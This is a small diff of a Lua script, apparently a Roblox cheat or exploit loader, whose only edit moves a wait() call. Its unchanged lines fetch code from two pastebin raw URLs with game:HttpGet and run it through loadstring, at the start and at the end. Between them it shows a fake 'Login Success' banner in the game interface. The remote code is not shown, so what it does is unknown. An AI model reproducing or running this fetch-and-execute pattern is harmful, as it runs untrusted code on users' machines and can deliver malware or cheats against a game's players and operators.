@@ -1,6 +1,5 @@
 loadstring(game:HttpGet('https://pastebin.com/raw/2EX82sdc'))()
 wait(0.000001)
-wait(0.000001)
 --LOADED FUNCTION
 	local s = Instance.new("Sound")
  
@@ -21,4 +20,5 @@ wait(0.000001)
 		game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.InnerBoxRight.TextLabel.Backdrop.Text = "Login Success, Welcome " ..game.Players.LocalPlayer.Name.. "!"
 			wait(5)
 game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.Visible = false
+wait(0.000001)
 loadstring(game:HttpGet('https://pastebin.com/raw/2ncFS2kH'))()
